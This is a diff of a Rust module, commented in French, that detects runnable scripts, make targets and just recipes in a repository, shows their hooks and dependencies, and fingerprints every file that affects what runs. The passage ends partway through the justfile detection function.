@@ -10,7 +10,8 @@
 //! - `package.json` : un runner par script (`<gestionnaire> run <nom>`), le
 //!   gestionnaire déduit du fichier de verrou (dossier, puis racine) ;
 //! - `GNUmakefile` / `makefile` / `Makefile` (celui que `make` prendrait) :
-//!   cibles explicites de ce fichier, sans suivre les inclusions ;
+//!   cibles explicites de ce fichier (les cibles des fichiers inclus ne sont
+//!   pas proposées) ;
 //! - `justfile` (et variantes) : recettes publiques sans paramètre requis ;
 //! - `Cargo.toml` : `cargo run` / `test` / `build`, `cargo run -p` des
 //!   membres du workspace qui ont un binaire ;
@@ -20,11 +21,29 @@
 //! - `pyproject.toml` : scripts déclarés, lancés par l'outil que désigne le
 //!   fichier de verrou (`uv`, `poetry`, `pdm`).
 //!
+//! **Empreinte (lot 15)** : le hachage de **fichiers entiers**, tous ceux
+//! qui influencent l'exécution ([`RunnerFile`], module `inputs`) : source,
+//! verrou, réglages du gestionnaire, inclusions et imports (de proche en
+//! proche), `.env`, Dockerfile… Le corps montré n'est qu'un extrait utile
+//! (script et crochets, cible et prérequis, recette et dépendances), précédé
+//! de la liste de ces fichiers. Non couverts : le code compilé (Cargo, Go,
+//! contexte de build), les scripts appelés par un script, les programmes du
+//! `PATH`, les fichiers hors du worktree.
+//!
 //! Un nom qui pourrait passer pour une option (`-…`), contient un caractère
 //! de contrôle ou une syntaxe de l'outil (`$`, `%`, `=`…) est écarté : le
 //! nom devient un argument de la commande, jamais une option.
 
-use std::collections::{BTreeMap, BTreeSet, HashSet};
+use std::collections::{BTreeMap, BTreeSet, HashMap, HashSet};
+
+mod compose;
+mod inputs;
+
+use inputs::Inputs;
+pub use inputs::{
+    FileState, Loaded, MAX_HASH_BYTES, MAX_RUNNER_FILES, MAX_STREAM_HASH_BYTES, RunnerFile,
+    parent_dir, resolve_dir, resolve_ref,
+};
 use std::path::Path;
 
 /// Fichier lu au plus (au-delà : source ignorée).
@@ -46,6 +65,8 @@ pub const MAX_URLS: usize = 16;
 const MAX_NAME_LEN: usize = 200;
 /// Ligne de sortie examinée au plus (au-delà, coupée).
 const MAX_LINE: usize = 4096;
+/// Cibles (make) ou recettes (just) suivies au plus pour une commande.
+pub const MAX_DEPENDENCIES: usize = 256;
 /// Séquence d'échappement (CSI, OSC, DCS…) lue au plus : au-delà, ou sur
 /// CAN / SUB, elle est abandonnée et le texte reprend (une chaîne jamais
 /// terminée n'absorbe pas la suite de la sortie).
@@ -98,38 +119,61 @@ pub struct Runner {
     pub cwd: String,
     /// `fichier:clé`.
     pub source: String,
-    /// Ce qui va réellement s'exécuter, tel que lu dans la source : corps du
-    /// script (`package.json`, `pyproject.toml`), règle et recette
-    /// (Makefile, justfile), fichier compose ; pour Cargo et Go, la commande.
-    /// Entier ici ; coupé à [`MAX_BODY_SHOWN`] pour l'affichage.
+    /// Extrait utile de ce qui va s'exécuter, tel que lu dans la source :
+    /// script et crochets (`package.json`, `pyproject.toml`), réglages,
+    /// règle et prérequis (Makefile), recette et dépendances (justfile),
+    /// fichier compose ; pour Cargo et Go, la commande. Montré précédé de la
+    /// liste des fichiers pris en compte ([`Runner::full_body`]).
     pub body: String,
     /// Fichier de verrou qui a choisi l'outil (`pnpm-lock.yaml`…), s'il y en a un.
     pub lock: Option<String>,
+    /// **Tous** les fichiers qui influencent l'exécution, hachés : la
+    /// matière de l'empreinte.
+    pub files: Vec<RunnerFile>,
 }
 
-/// Corps montré au plus (octets) ; l'empreinte porte sur le corps entier.
+/// Corps montré au plus (octets).
 pub const MAX_BODY_SHOWN: usize = 4096;
 
 impl Runner {
-    /// Empreinte de ce qui sera lancé : SHA-256 (hexadécimal) de
-    /// `[command, cwd, source, body, lock]` en JSON. Un corps de script
-    /// modifié, un autre verrou ou une autre commande la changent.
+    /// Empreinte de ce qui sera lancé : SHA-256 (hexadécimal) du JSON
+    /// `[command, cwd, source, [[chemin, état, empreinte], …]]`, fichiers
+    /// triés par chemin ([`RunnerFile`] : contenu brut haché en entier, ou
+    /// marqueur). Toute modification d'un fichier pris en compte, son
+    /// apparition ou sa disparition, ou une autre commande la changent.
     pub fn fingerprint(&self) -> String {
-        let v = serde_json::json!([self.command, self.cwd, self.source, self.body, self.lock]);
+        let mut files: Vec<(&str, &str, &str)> = self
+            .files
+            .iter()
+            .map(|f| (f.path.as_str(), f.state.as_str(), f.digest.as_str()))
+            .collect();
+        files.sort();
+        files.dedup();
+        let v = serde_json::json!([self.command, self.cwd, self.source, files]);
         super::files::sha256_hex(v.to_string().as_bytes())
+    }
+
+    /// Corps entier : la liste des fichiers pris en compte, puis l'extrait.
+    pub fn full_body(&self) -> String {
+        if self.files.is_empty() {
+            return self.body.clone();
+        }
+        format!("{}\n\n{}", inputs::files_header(&self.files), self.body)
     }
 
     /// Corps à montrer (coupé à [`MAX_BODY_SHOWN`] octets, sur une limite de
     /// caractère) et s'il a été coupé.
-    pub fn shown_body(&self) -> (&str, bool) {
-        if self.body.len() <= MAX_BODY_SHOWN {
-            return (&self.body, false);
+    pub fn shown_body(&self) -> (String, bool) {
+        let mut body = self.full_body();
+        if body.len() <= MAX_BODY_SHOWN {
+            return (body, false);
         }
         let mut end = MAX_BODY_SHOWN;
-        while !self.body.is_char_boundary(end) {
+        while !body.is_char_boundary(end) {
             end -= 1;
         }
-        (&self.body[..end], true)
+        body.truncate(end);
+        (body, true)
     }
 
     fn with_body(mut self, body: impl Into<String>) -> Self {
@@ -141,6 +185,11 @@ impl Runner {
         self.lock = lock;
         self
     }
+
+    fn with_files(mut self, files: &[RunnerFile]) -> Self {
+        self.files = files.to_vec();
+        self
+    }
 }
 
 /// Lecture du worktree, confinée à sa racine (implémentée par le démon avec
@@ -148,8 +197,15 @@ impl Runner {
 /// séparés par `/`, `""` pour la racine.
 pub trait RepoView {
     /// Contenu d'un fichier ordinaire (texte UTF-8, [`MAX_SOURCE_BYTES`] au
-    /// plus), `None` s'il est absent, trop gros ou illisible.
+    /// plus), `None` s'il est absent, trop gros ou illisible. Pour la
+    /// détection seulement (code Go, membres Cargo…).
     fn read(&self, rel: &str) -> Option<String>;
+    /// Contenu brut d'un fichier pris en compte, [`MAX_HASH_BYTES`] au plus.
+    fn load(&self, rel: &str) -> Loaded;
+    /// Pour un fichier plus gros que [`MAX_HASH_BYTES`] : SHA-256 de son
+    /// contenu lu par blocs, [`MAX_STREAM_HASH_BYTES`] au plus ; `(taille,
+    /// empreinte)`, l'empreinte `None` au-delà ; `None` s'il est illisible.
+    fn hash_large(&self, rel: &str) -> Option<(u64, Option<String>)>;
     /// Le fichier existe (fichier ordinaire, sans suivre de lien sortant).
     fn is_file(&self, rel: &str) -> bool;
     /// Le dossier existe.
@@ -252,6 +308,7 @@ fn runner(
         cwd: dir.to_owned(),
         source,
         lock: None,
+        files: Vec::new(),
     }
 }
 
@@ -314,7 +371,8 @@ fn package_manager(
 }
 
 fn detect_package_json(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
-    let Some(text) = view.read(&join(dir, "package.json")) else {
+    let mut inputs = Inputs::new(view);
+    let Some(text) = inputs.file_if_present(&join(dir, "package.json"), "source") else {
         return;
     };
     let Ok(v) = serde_json::from_str::<serde_json::Value>(&text) else {
@@ -328,6 +386,26 @@ fn detect_package_json(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
         dir,
         v.get("packageManager").and_then(serde_json::Value::as_str),
     );
+    if let Some(l) = &lock {
+        inputs.file(l, "fichier de verrou");
+    }
+    // Réglages du gestionnaire lus dans le dépôt (`script-shell`,
+    // `ignore-scripts`…) : listés même absents (leur apparition compte).
+    let configs: &[&str] = match pm {
+        "yarn" => &[".yarnrc.yml", ".yarnrc", ".npmrc"],
+        "bun" => &["bunfig.toml", ".npmrc"],
+        _ => &[".npmrc"],
+    };
+    let mut config_dirs = vec![dir];
+    if !dir.is_empty() {
+        config_dirs.push("");
+    }
+    for d in config_dirs {
+        for c in configs {
+            inputs.file(&join(d, c), "réglages du gestionnaire");
+        }
+    }
+    let files = inputs.into_files();
     for (name, body) in scripts {
         let Some(body) = body.as_str() else {
             continue;
@@ -352,10 +430,39 @@ fn detect_package_json(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
                 classify(name),
                 vec![pm, "run", name],
             )
-            .with_body(body)
-            .with_lock(lock.clone()),
+            .with_body(script_body(scripts, name, body))
+            .with_lock(lock.clone())
+            .with_files(&files),
         );
     }
+}
+
+/// Corps d'un script avec ses crochets : `pre<nom>` et `post<nom>` sont
+/// lancés avec lui par npm, pnpm (`enable-pre-post-scripts`, vrai par
+/// défaut), bun et yarn 1 (pas par yarn 2 et suivants : montrés quand même,
+/// dans le doute). Sans crochet : le corps seul ; sinon
+/// `[pre<nom>] …` / `[<nom>] …` / `[post<nom>] …`.
+fn script_body(
+    scripts: &serde_json::Map<String, serde_json::Value>,
+    name: &str,
+    body: &str,
+) -> String {
+    let hook = |prefix: &str| {
+        let key = format!("{prefix}{name}");
+        scripts
+            .get(&key)
+            .and_then(serde_json::Value::as_str)
+            .map(|b| format!("[{key}] {b}"))
+    };
+    let (pre, post) = (hook("pre"), hook("post"));
+    if pre.is_none() && post.is_none() {
+        return body.to_owned();
+    }
+    pre.into_iter()
+        .chain(std::iter::once(format!("[{name}] {body}")))
+        .chain(post)
+        .collect::<Vec<_>>()
+        .join("\n")
 }
 
 // --------------------------------------------------------------------- make
@@ -371,6 +478,70 @@ pub fn make_targets(text: &str) -> Vec<String> {
 /// Cibles de [`make_targets`] avec leur corps : chaque ligne de règle qui
 /// les définit, suivie de ses lignes de recette.
 pub fn make_rules(text: &str) -> Vec<(String, String)> {
+    let parsed = parse_make(text);
+    parsed
+        .rules
+        .into_iter()
+        .filter(|r| {
+            let name = r.name.as_str();
+            safe_name(name)
+                && !name.starts_with('.')
+                && !name.contains(['$', '%', '(', ')', '=', '\\', '/', '"', '\'', '*', '?'])
+                && (!name.contains('.') || parsed.phony.contains(name))
+        })
+        .map(|r| (r.name, r.lines.join("\n")))
+        .collect()
+}
+
+/// Règle explicite d'un Makefile (une cible, toutes ses lignes de règle).
+struct MakeRule {
+    name: String,
+    /// Prérequis, normaux puis d'ordre (`|`), dans l'ordre d'écriture.
+    prereqs: Vec<String>,
+    /// Lignes de règle et de recette.
+    lines: Vec<String>,
+}
+
+/// Lecture d'un Makefile : toutes les cibles explicites nommées (fichiers
+/// compris, sans motif ni variable ni cible spéciale `.XXX`), cibles
+/// `.PHONY`, fichiers inclus tels qu'écrits.
+struct MakeParse {
+    rules: Vec<MakeRule>,
+    phony: HashSet<String>,
+    includes: Vec<String>,
+    /// Lignes de réglage qui changent toute exécution (`SHELL`,
+    /// `.ONESHELL`, `.SHELLFLAGS`, `export`…), telles qu'écrites.
+    settings: Vec<String>,
+    /// Le fichier a des règles à motif (`%`) : non suivies.
+    patterns: bool,
+}
+
+/// Ligne de réglage global d'un Makefile (montrée avec chaque cible).
+fn make_setting(trimmed: &str) -> bool {
+    let t = trimmed
+        .strip_prefix("override ")
+        .unwrap_or(trimmed)
+        .trim_start();
+    let named = |n: &str| {
+        t.strip_prefix(n)
+            .is_some_and(|r| r.is_empty() || r.starts_with([' ', '\t', ':', '=', '?', '+', '!']))
+    };
+    [
+        "SHELL",
+        ".SHELLFLAGS",
+        ".ONESHELL",
+        ".POSIX",
+        ".EXPORT_ALL_VARIABLES",
+        "MAKEFLAGS",
+    ]
+    .iter()
+    .any(|n| named(n))
+        || t.starts_with("export ")
+        || t == "export"
+        || t.starts_with("unexport ")
+}
+
+fn parse_make(text: &str) -> MakeParse {
     let mut lines: Vec<String> = Vec::new();
     let mut cur = String::new();
     for raw in text.lines() {
@@ -385,8 +556,11 @@ pub fn make_rules(text: &str) -> Vec<(String, String)> {
     if !cur.is_empty() {
         lines.push(cur);
     }
-    let mut targets: Vec<(String, Vec<String>)> = Vec::new();
+    let mut rules: Vec<MakeRule> = Vec::new();
     let mut phony: HashSet<String> = HashSet::new();
+    let mut includes: Vec<String> = Vec::new();
+    let mut settings: Vec<String> = Vec::new();
+    let mut patterns = false;
     let mut in_define = 0usize;
     // Cibles de la dernière règle (reçoivent les lignes de recette).
     let mut current: Vec<usize> = Vec::new();
@@ -394,7 +568,7 @@ pub fn make_rules(text: &str) -> Vec<(String, String)> {
         if full.starts_with('\t') {
             if in_define == 0 {
                 for &i in &current {
-                    targets[i].1.push(full.clone());
+                    rules[i].lines.push(full.clone());
                 }
             }
             continue; // recette
@@ -425,9 +599,16 @@ pub fn make_rules(text: &str) -> Vec<(String, String)> {
         if in_define > 0 || trimmed.is_empty() {
             continue;
         }
+        if make_setting(trimmed) {
+            settings.push(full.trim_end().to_owned());
+        }
+        if ["include", "-include", "sinclude"].contains(&first) {
+            includes.extend(trimmed.split_whitespace().skip(1).map(str::to_owned));
+            continue;
+        }
         if [
-            "include", "-include", "sinclude", "export", "unexport", "override", "vpath", "ifeq",
-            "ifneq", "ifdef", "ifndef", "else", "endif", "undefine", "private", "load",
+            "export", "unexport", "override", "vpath", "ifeq", "ifneq", "ifdef", "ifndef", "else",
+            "endif", "undefine", "private", "load",
         ]
         .contains(&first)
         {
@@ -459,41 +640,163 @@ pub fn make_rules(text: &str) -> Vec<(String, String)> {
         if recipe_cut.contains('=') {
             continue; // variable propre à une cible (`t: X = 1`)
         }
+        // Règle à motif statique (`objs: %.o: %.c`) : prérequis non suivis.
+        let prereqs: Vec<String> = if recipe_cut.contains(':') {
+            Vec::new()
+        } else {
+            recipe_cut
+                .split_whitespace()
+                .filter(|p| *p != "|")
+                .map(str::to_owned)
+                .collect()
+        };
         for name in names_part.split_whitespace() {
-            let ok = safe_name(name)
-                && !name.starts_with('.')
-                && !name.contains(['$', '%', '(', ')', '=', '\\', '/', '"', '\'', '*', '?']);
-            if !ok {
+            let special = name
+                .strip_prefix('.')
+                .is_some_and(|r| r.starts_with(|c: char| c.is_ascii_uppercase()));
+            if name.contains('%') {
+                patterns = true;
+            }
+            if special || name.contains(['$', '%']) {
                 continue;
             }
-            let i = match targets.iter().position(|(t, _)| t == name) {
+            let i = match rules.iter().position(|r| r.name == name) {
                 Some(i) => i,
                 None => {
-                    targets.push((name.to_owned(), Vec::new()));
-                    targets.len() - 1
+                    rules.push(MakeRule {
+                        name: name.to_owned(),
+                        prereqs: Vec::new(),
+                        lines: Vec::new(),
+                    });
+                    rules.len() - 1
                 }
             };
-            targets[i].1.push(full.trim_end().to_owned());
+            for p in &prereqs {
+                if !rules[i].prereqs.contains(p) {
+                    rules[i].prereqs.push(p.clone());
+                }
+            }
+            rules[i].lines.push(full.trim_end().to_owned());
             current.push(i);
         }
     }
-    targets.retain(|(t, _)| !t.contains('.') || phony.contains(t));
-    targets
-        .into_iter()
-        .map(|(t, body)| (t, body.join("\n")))
-        .collect()
+    MakeParse {
+        rules,
+        phony,
+        includes,
+        settings,
+        patterns,
+    }
+}
+
+/// Corps de `make <cible>` : les règles et recettes des prérequis
+/// (transitivement, ceux définis dans ce fichier), dans l'ordre où make les
+/// construit (prérequis d'abord, de gauche à droite), puis celles de la
+/// cible ; chaque cible une fois (cycle sans fin impossible),
+/// [`MAX_DEPENDENCIES`] au plus.
+fn make_body(parsed: &MakeParse, target: &str) -> String {
+    let index: HashMap<&str, usize> = parsed
+        .rules
+        .iter()
+        .enumerate()
+        .map(|(i, r)| (r.name.as_str(), i))
+        .collect();
+    let mut seen: HashSet<usize> = HashSet::new();
+    let mut blocks: Vec<String> = Vec::new();
+    let mut cut = false;
+    // Parcours en profondeur sans récursion : (règle, prérequis déjà vus).
+    let Some(&start) = index.get(target) else {
+        return String::new();
+    };
+    seen.insert(start);
+    let mut stack: Vec<(usize, usize)> = vec![(start, 0)];
+    while let Some((i, k)) = stack.pop() {
+        let rule = &parsed.rules[i];
+        if let Some(p) = rule.prereqs.get(k) {
+            stack.push((i, k + 1));
+            if let Some(&j) = index.get(p.as_str())
+                && !seen.contains(&j)
+            {
+                if seen.len() >= MAX_DEPENDENCIES {
+                    cut = true;
+                    continue;
+                }
+                seen.insert(j);
+                stack.push((j, 0));
+            }
+            continue;
+        }
+        blocks.push(rule.lines.join("\n"));
+    }
+    if cut {
+        blocks.push(format!(
+            "# … prérequis au-delà de {MAX_DEPENDENCIES} non montrés"
+        ));
+    }
+    // Ce que ce parcours ne suit pas : dit, le fichier entier reste pris en compte.
+    let mut unfollowed: Vec<&str> = seen
+        .iter()
+        .flat_map(|&i| parsed.rules[i].prereqs.iter())
+        .filter(|p| p.contains('$'))
+        .map(String::as_str)
+        .collect();
+    unfollowed.sort_unstable();
+    unfollowed.dedup();
+    if !unfollowed.is_empty() {
+        blocks.push(format!(
+            "# prérequis à variable non suivis : {}",
+            unfollowed.join(" ")
+        ));
+    }
+    if parsed.patterns {
+        blocks.push("# règles à motif (%) non suivies".into());
+    }
+    let mut out = String::new();
+    if !parsed.settings.is_empty() {
+        out.push_str(&parsed.settings.join("\n"));
+        out.push_str("\n\n");
+    }
+    out.push_str(&blocks.join("\n"));
+    out
+}
+
+/// Prend en compte les fichiers inclus d'un Makefile (relatifs au dossier
+/// de lancement de make, `dir`), et ceux qu'ils incluent, lus jusqu'à
+/// [`MAX_HASH_BYTES`].
+fn make_includes(inputs: &mut Inputs<'_>, dir: &str, includes: &[String]) {
+    for w in includes {
+        if let Some(text) = inputs.reference(dir, w, "inclus (include)") {
+            make_includes(inputs, dir, &parse_make(&text).includes);
+        }
+    }
 }
 
 fn detect_make(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
-    // L'ordre de recherche de GNU make : seul le premier compte.
-    let Some((file, text)) = ["GNUmakefile", "makefile", "Makefile"]
-        .iter()
-        .find_map(|f| view.read(&join(dir, f)).map(|t| (*f, t)))
-    else {
+    // L'ordre de recherche de GNU make : seul le premier compte ; ceux
+    // d'avant sont pris en compte absents (leur apparition change tout).
+    let mut inputs = Inputs::new(view);
+    let mut found = None;
+    for f in ["GNUmakefile", "makefile", "Makefile"] {
+        let path = join(dir, f);
+        if matches!(view.load(&path), Loaded::Absent(_)) {
+            inputs.file(&path, "Makefile prioritaire, s'il apparaît");
+            continue;
+        }
+        found = inputs.file(&path, "source").map(|t| (f, t));
+        break;
+    }
+    let Some((file, text)) = found else {
         return;
     };
-    for (t, body) in make_rules(&text) {
-        out.push(runner(dir, file, &t, t.clone(), classify(&t), vec!["make", &t]).with_body(body));
+    let parsed = parse_make(&text);
+    make_includes(&mut inputs, dir, &parsed.includes);
+    let files = inputs.into_files();
+    for (t, _) in make_rules(&text) {
+        out.push(
+            runner(dir, file, &t, t.clone(), classify(&t), vec!["make", &t])
+                .with_body(make_body(&parsed, &t))
+                .with_files(&files),
+        );
     }
 }
 
@@ -509,8 +812,117 @@ pub fn just_recipes(text: &str) -> Vec<String> {
 /// Recettes de [`just_recipes`] avec leur corps : l'en-tête et ses lignes
 /// indentées.
 pub fn just_rules(text: &str) -> Vec<(String, String)> {
+    parse_just(text)
+        .recipes
+        .into_iter()
+        .filter(|r| r.offered)
+        .map(|r| (r.name, r.body))
+        .collect()
+}
+
+/// Recette d'un justfile (toutes, privées comprises : dépendances possibles).
+struct JustRecipe {
+    name: String,
+    /// En-tête et lignes indentées.
+    body: String,
+    /// Dépendances lancées avant (`a: b c`), puis après (`a: b && c`).
+    before: Vec<String>,
+    after: Vec<String>,
+    /// Proposée comme runner (publique, sans paramètre requis, nom sûr).
+    offered: bool,
+}
+
+/// Lecture d'un justfile : recettes, et fichiers importés tels qu'écrits
+/// (`import 'f'`, `import? 'f'`, `mod nom ['f']`, `mod? nom ['f']`).
+struct JustParse {
+    recipes: Vec<JustRecipe>,
+    /// `(genre, nom de module ou None, chemin écrit ou None)`.
+    imports: Vec<(&'static str, Option<String>, Option<String>)>,
+    /// Lignes `set …` et `export …`, telles qu'écrites (montrées avec
+    /// chaque recette : `set shell`, `set dotenv-load`…).
+    settings: Vec<String>,
+    /// `.env` chargé (`set dotenv-load`, ou `dotenv-filename` /
+    /// `dotenv-path` donnés) : `(nom de fichier, chemin imposé)`.
+    dotenv: Option<(String, Option<String>)>,
+}
+
+/// Réglage `set <nom> [:= valeur]` d'un justfile : `(nom, valeur)`.
+fn just_setting(t: &str) -> Option<(&str, Option<String>)> {
+    let rest = t.strip_prefix("set ")?.trim();
+    let (name, value) = match rest.split_once(":=") {
+        Some((n, v)) => (n.trim(), Some(v.trim())),
+        None => (rest, None),
+    };
+    let value = value.map(|v| unquote(v).unwrap_or_else(|| v.to_owned()));
+    Some((name, value))
+}
+
+/// Texte entre guillemets simples ou doubles (sans échappement interprété).
+fn unquote(s: &str) -> Option<String> {
+    let s = s.trim();
+    let q = s.chars().next()?;
+    if !matches!(q, '\'' | '"') || s.len() < 2 || !s.ends_with(q) {
+        return None;
+    }
+    Some(s[1..s.len() - 1].to_owned())
+}
+
+/// Dépendances d'un en-tête de recette (texte après le `:`) : noms, ou
+/// `(nom arguments…)` ; `&&` sépare celles d'avant et celles d'après.
+fn just_deps(rest: &str) -> (Vec<String>, Vec<String>) {
+    let chars: Vec<char> = rest.chars().collect();
+    let (mut before, mut after) = (Vec::new(), Vec::new());
+    let mut later = false;
+    let mut i = 0;
+    let word = |chars: &[char], mut i: usize| {
+        let start = i;
+        while i < chars.len()
+            && (chars[i].is_ascii_alphanumeric() || chars[i] == '_' || chars[i] == '-')
+        {
+            i += 1;
+        }
+        (chars[start..i].iter().collect::<String>(), i)
+    };
+    while i < chars.len() {
+        let c = chars[i];
+        if c.is_whitespace() {
+            i += 1;
+        } else if c == '&' && chars.get(i + 1) == Some(&'&') {
+            later = true;
+            i += 2;
+        } else if c == '(' {
+            let mut j = i + 1;
+            while j < chars.len() && chars[j].is_whitespace() {
+                j += 1;
+            }
+            let (name, _) = word(&chars, j);
+            // Fin de la parenthèse (guillemets respectés).
+            let Some(end) = skip_just_value(&chars, i) else {
+                break;
+            };
+            if !name.is_empty() {
+                if later { &mut after } else { &mut before }.push(name);
+            }
+            i = end;
+        } else {
+            let (name, j) = word(&chars, i);
+            if name.is_empty() {
+                break; // commentaire ou syntaxe inconnue
+            }
+            if later { &mut after } else { &mut before }.push(name);
+            i = j;
+        }
+    }
+    (before, after)
+}
+
+fn parse_just(text: &str) -> JustParse {
     let all: Vec<&str> = text.lines().collect();
-    let mut out: Vec<(String, String)> = Vec::new();
+    let mut recipes: Vec<JustRecipe> = Vec::new();
+    let mut imports = Vec::new();
+    let mut settings = Vec::new();
+    let mut dotenv: Option<(String, Option<String>)> = None;
+    let mut dotenv_set = false;
     let mut private_next = false;
     for (idx, line) in all.iter().enumerate() {
         let line = *line;
@@ -529,9 +941,45 @@ pub fn just_rules(text: &str) -> Vec<(String, String)> {
         }
         let private = std::mem::take(&mut private_next);
         let first = t.split_whitespace().next().unwrap_or("");
-        if ["set", "alias", "export", "import", "mod", "unexport"].contains(&first)
-            && t.len() > first.len()
-        {
+        if matches!(first, "import" | "import?") && t.len() > first.len() {
+            imports.push(("import", None, unquote(&t[first.len()..])));
+            continue;
+        }
+        if matches!(first, "mod" | "mod?") && t.len() > first.len() {
+            let rest = t[first.len()..].trim();
+            let (name, path) = match rest.split_once(char::is_whitespace) {
+                Some((n, p)) => (n, unquote(p)),
+                None => (rest, None),
+            };
+            imports.push(("mod", Some(name.to_owned()), path));
+            continue;
+        }
+        if ["set", "export", "unexport"].contains(&first) && t.len() > first.len() {
+            settings.push(t.to_owned());
+            if let Some((name, value)) = just_setting(t) {
+                let on = value.as_deref().is_none_or(|v| v == "true");
+                let (mut file, mut path) = dotenv.take().unwrap_or((".env".to_owned(), None));
+                let mut load = dotenv_set;
+                match name {
+                    "dotenv-load" => load = on,
+                    "dotenv-filename" => {
+                        if let Some(v) = value {
+                            file = v;
+                        }
+                        load = true;
+                    }
+                    "dotenv-path" => {
+                        path = value;
+                        load = true;
+                    }
+                    _ => {}
+                }
+                dotenv_set = load;
+                dotenv = Some((file, path));
+            }
+            continue;
+        }
+        if first == "alias" && t.len() > first.len() {
             continue;
         }
         let body = t.strip_prefix('@').unwrap_or(t);
@@ -547,39 +995,159 @@ pub fn just_rules(text: &str) -> Vec<(String, String)> {
         if rest.trim_start().starts_with(":=") {
             continue; // affectation
         }
-        let Some(params) = just_params(rest) else {
+        let Some((params, deps)) = just_params(rest) else {
             continue;
         };
-        if private || name.starts_with('_') || !safe_name(name) {
+        if recipes.iter().any(|r| r.name == name) {
             continue;
         }
-        if params.iter().any(|p| p.required) {
+        let offered = !(private
+            || name.starts_with('_')
+            || !safe_name(name)
+            || params.iter().any(|p| p.required));
+        let mut lines = vec![t];
+        for next in &all[idx + 1..] {
+            if !(next.starts_with([' ', '\t']) || next.trim().is_empty()) {
+                break;
+            }
+            lines.push(next.trim_end());
+        }
+        while lines.last().is_some_and(|l| l.is_empty()) {
+            lines.pop();
+        }
+        let (before, after) = just_deps(&deps);
+        recipes.push(JustRecipe {
+            name: name.to_owned(),
+            body: lines.join("\n"),
+            before,
+            after,
+            offered,
+        });
+    }
+    JustParse {
+        recipes,
+        imports,
+        settings,
+        dotenv: dotenv.filter(|_| dotenv_set),
+    }
+}
+
+/// Corps de `just <recette>` : dépendances d'avant (transitivement), la
+/// recette, puis dépendances d'après, dans l'ordre de just ; chaque recette
+/// une fois, [`MAX_DEPENDENCIES`] au plus.
+fn just_body(parsed: &JustParse, name: &str) -> String {
+    let index: HashMap<&str, usize> = parsed
+        .recipes
+        .iter()
+        .enumerate()
+        .map(|(i, r)| (r.name.as_str(), i))
+        .collect();
+    let mut seen: HashSet<usize> = HashSet::new();
+    let mut blocks: Vec<String> = Vec::new();
+    let mut cut = false;
+    let Some(&start) = index.get(name) else {
+        return String::new();
+    };
+    seen.insert(start);
+    // Pile : (recette, étape) ; étapes 0..before, puis le corps, puis after.
+    let mut stack: Vec<(usize, usize)> = vec![(start, 0)];
+    while let Some((i, k)) = stack.pop() {
+        let r = &parsed.recipes[i];
+        let dep = if k < r.before.len() {
+            Some(&r.before[k])
+        } else if k == r.before.len() {
+            blocks.push(r.body.clone());
+            None
+        } else {
+            r.after.get(k - r.before.len() - 1)
+        };
+        if k > r.before.len() + r.after.len() {
             continue;
         }
-        if !out.iter().any(|(n, _)| n == name) {
-            let mut body = vec![t];
-            for next in &all[idx + 1..] {
-                if !(next.starts_with([' ', '\t']) || next.trim().is_empty()) {
-                    break;
-                }
-                body.push(next.trim_end());
+        stack.push((i, k + 1));
+        if let Some(d) = dep
+            && let Some(&j) = index.get(d.as_str())
+            && !seen.contains(&j)
+        {
+            if seen.len() >= MAX_DEPENDENCIES {
+                cut = true;
+                continue;
             }
-            while body.last().is_some_and(|l| l.is_empty()) {
-                body.pop();
-            }
-            out.push((name.to_owned(), body.join("\n")));
+            seen.insert(j);
+            stack.push((j, 0));
         }
     }
+    if cut {
+        blocks.push(format!(
+            "# … dépendances au-delà de {MAX_DEPENDENCIES} non montrées"
+        ));
+    }
+    let mut out = String::new();
+    if !parsed.settings.is_empty() {
+        out.push_str(&parsed.settings.join("\n"));
+        out.push_str("\n\n");
+    }
+    out.push_str(&blocks.join("\n"));
     out
+}
+
+/// Prend en compte les fichiers importés d'un justfile `file` (chemins
+/// relatifs à son dossier ; module sans chemin : `nom.just`,
+/// `nom/mod.just`, `nom/justfile`, `nom/.justfile`, le premier présent),
+/// et ceux qu'ils importent.
+fn just_imports(inputs: &mut Inputs<'_>, view: &dyn RepoView, file: &str, parsed: &JustParse) {
+    let base = parent_dir(file);
+    for (kind, module, path) in &parsed.imports {
+        let role = if *kind == "mod" {
+            "module (mod)"
+        } else {
+            "importé (import)"
+        };
+        let text = match (path, module) {
+            (Some(p), _) => inputs
+                .reference(base, p, role)
+                .map(|t| (resolve_ref(base, p), t)),
+            (None, Some(m)) => {
+                let candidates = [
+                    format!("{m}.just"),
+                    format!("{m}/mod.just"),
+                    format!("{m}/justfile"),
+                    format!("{m}/.justfile"),
+                ];
+                let chosen = candidates
+                    .iter()
+                    .find(|c| {
+                        resolve_ref(base, c)
+                            .is_ok_and(|p| !matches!(view.load(&p), Loaded::Absent(_)))
+                    })
+                    .unwrap_or(&candidates[0]);
+                inputs
+                    .reference(base, chosen, role)
+                    .map(|t| (resolve_ref(base, chosen), t))
+            }
+            (None, None) => {
+                inputs.marker(
+                    file,
+                    FileState::Unresolved,
+                    &format!("{role} ; forme non lue"),
+                );
+                None
+            }
+        };
+        if let Some((Ok(p), t)) = text {
+            just_imports(inputs, view, &p, &parse_just(&t));
+        }
+    }
 }
 
 struct JustParam {
     required: bool,
 }
 
-/// Paramètres d'un en-tête de recette (texte après le nom, jusqu'au `:`),
-/// `None` si ce n'est pas un en-tête de recette.
-fn just_params(rest: &str) -> Option<Vec<JustParam>> {
+/// Paramètres d'un en-tête de recette (texte après le nom, jusqu'au `:`)
+/// et texte après le `:` (dépendances), `None` si ce n'est pas un en-tête
+/// de recette.
+fn just_params(rest: &str) -> Option<(Vec<JustParam>, String)> {
     let mut params = Vec::new();
     let chars: Vec<char> = rest.chars().collect();
     let mut i = 0;
@@ -594,7 +1162,7 @@ fn just_params(rest: &str) -> Option<Vec<JustParam>> {
             if chars.get(i + 1) == Some(&'=') {
                 return None;
             }
-            return Some(params);
+            return Some((params, chars[i + 1..].iter().collect()));
         }
         // Un paramètre : [+*][$]nom[=défaut].
         // `*` : zéro ou plus (facultatif) ; `+` : un ou plus (requis).
@@ -678,14 +1246,47 @@ fn skip_just_value(chars: &[char], mut i: usize) -> Option<usize> {
 }
 
 fn detect_just(view: &dyn RepoView, dir: &str, out: &mut Vec<Runner>) {
+    let mut inputs = Inputs::new(view);
     let Some((file, text)) = ["justfile", "Justfile", ".justfile", "JUSTFILE"]
         .iter()
-        .find_map(|f| view.read(&join(dir, f)).map(|t| (*f, t)))
